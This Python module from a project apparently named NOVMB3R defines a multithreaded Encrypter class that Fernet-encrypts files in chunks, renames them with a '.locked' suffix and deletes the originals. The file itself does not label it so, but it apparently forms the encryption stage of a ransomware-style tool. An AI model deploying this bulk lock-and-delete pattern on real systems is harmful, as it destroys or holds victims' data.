#  _   _  _____     ____  __ ____ _____ ____
# | \ | |/ _ \ \   / /  \/  | __ )___ /|  _ \
# |  \| | | | \ \ / /| |\/| |  _ \ |_ \| |_) |
# | |\  | |_| |\ V / | |  | | |_) |__) |  _ <
# |_| \_|\___/  \_/  |_|  |_|____/____/|_| \_\
#
# Copyright (c) 2024-2025 Daniel Lima
#
# Licensed under the MIT License.
# See the LICENSE file in the project root for full license text.

"""Provides functionality to encrypt files using Fernet symmetric encryption."""

from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BufferedReader, BufferedWriter
from pathlib import Path
from typing import Iterable, Literal

from cryptography.fernet import Fernet

from utils import MAX_WORKERS


class Encrypter:
    def __init__(
        self,
        fernet: Fernet,
        files: Iterable[Path] | None = None,
        byteorder: Literal["little", "big"] = "big",
    ):
        self.files = files
        self.fernet = fernet
        self.byteorder = byteorder

    @staticmethod
    def validate_buffer(buff_size: int) -> int:
        """
        Ensures that the buffer size is between 8KB and 256KB.

        Args:
            buff_size (int): Desired buffer size in bytes.

        Returns:
            int: A buffer size constrained to the range [8192, 262144].
        """
        MAX_BUFF = 262144
        MIN_BUFF = 8192
        return max(MIN_BUFF, min(MAX_BUFF, buff_size))

    def _encrypt_stream(
        self, input_stream: BufferedReader, output_stream: BufferedWriter, buff: int
    ):
        """
        Encrypts data from an input stream and writes it to an output stream in chunks.

        Each chunk is prefixed by its length in bytes, allowing correct decryption later.

        Args:
            input_stream (BufferedReader): Stream to read plaintext data from.
            output_stream (BufferedWriter): Stream to write encrypted data to.
            buff (int): Chunk size in bytes. Will be validated between 8KB and 256KB.
        """
        buff = Encrypter.validate_buffer(buff)
        while chunk := input_stream.read(buff):
            enc = self.fernet.encrypt(chunk)
            output_stream.write(len(enc).to_bytes(4, self.byteorder))  # type: ignore
            output_stream.write(enc)

    def encrypt_file(self, file: Path, suffix: str = ".locked", buff: int = 8192):
        """
        Encrypts a single file and optionally renames it with a suffix.

        After successful encryption, the original file is deleted.

        Args:
            file (Path): Path to the file to encrypt.
            suffix (str, optional): Suffix to append to the encrypted file's name.
                Defaults to ".locked".
            buff (int, optional): Buffer size for chunked processing. Validated to
                the range [8KB, 256KB]. Defaults to 8KB.
        """
        buff = Encrypter.validate_buffer(buff)
        dest = file.with_name(file.name + suffix)
        try:
            with file.open("rb") as f_in, dest.open("wb") as f_out:
                self._encrypt_stream(f_in, f_out, buff)
            file.unlink()
        except (PermissionError, FileNotFoundError, IsADirectoryError) as e:
            print(f"Skipping: {file}: {e}")

    def encrypt(self):
        """
        Encrypts all files provided to the Encrypter instance using a thread pool.

        Files are processed concurrently up to MAX_WORKERS threads. Any exceptions
        during encryption are caught and logged without stopping the process.
        """
        if not self.files:
            raise ValueError("Files cannot be empty")

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(self.encrypt_file, file) for file in self.files]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error: {e}")
